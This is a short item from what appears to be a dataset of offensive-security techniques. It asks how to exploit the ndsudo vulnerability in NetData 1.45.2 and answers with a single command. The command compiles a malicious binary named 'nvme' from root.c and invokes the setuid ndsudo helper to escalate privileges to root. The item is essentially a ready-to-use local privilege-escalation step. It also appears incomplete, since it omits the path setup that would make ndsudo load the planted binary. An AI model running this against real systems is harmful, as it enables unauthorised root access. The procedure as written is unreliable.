TECHNIQUE / QUESTION:
How can you exploit the ndsudo vulnerability found in NetData?

CONTEXT:
You know that NetData version 1.45.2 has a vulnerability related to ndsudo.

METHOD / ANSWER:
Command: `gcc -o nvme root.c && /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list --test`
Explanation: This illustrates crafting a malicious binary to misuse the ndsudo executable, allowing for privilege escalation.
